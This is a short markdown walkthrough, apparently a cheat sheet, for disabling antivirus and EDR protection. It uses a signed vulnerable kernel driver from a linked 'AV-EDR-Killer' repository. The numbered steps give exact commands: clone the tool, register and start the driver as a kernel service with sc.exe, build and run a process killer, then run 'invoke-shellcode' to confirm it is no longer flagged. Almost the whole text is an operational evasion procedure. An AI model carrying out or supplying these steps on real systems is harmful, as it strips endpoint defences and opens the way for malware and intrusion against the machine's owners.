# Signed Driver - EDR Evasion

## Repository: 

https://github.com/xM0kht4r/AV-EDR-Killer

## Research Link: 

https://cqureacademy.com/blog/cqure-hacks-76-evading-edr-using-signed-driver/

## One Example

### 1) Download Project

    git clone https://github.com/xM0kht4r/AV-EDR-Killer
    cd C:\temp\AV-EDR-Killer-main\
    
### 2) Create a new Windows Service entry

    sc.exe create MaliciousDriver1 binPath= "C:\CQ\AV-EDR-Killer-main\vulndriver.sys" type= kernel

### 3) Start service

    sc.exe start MaliciousDriver1

### 4) Compile the process killer projext

    cd .\src\
    cargo build --release

### 5) Launch our script

    cd .\target\
    cd .\release\
    .\Killer.exe

### 6) Run a malicious command to verify that the command is no longer flagged

    invoke-shellcode
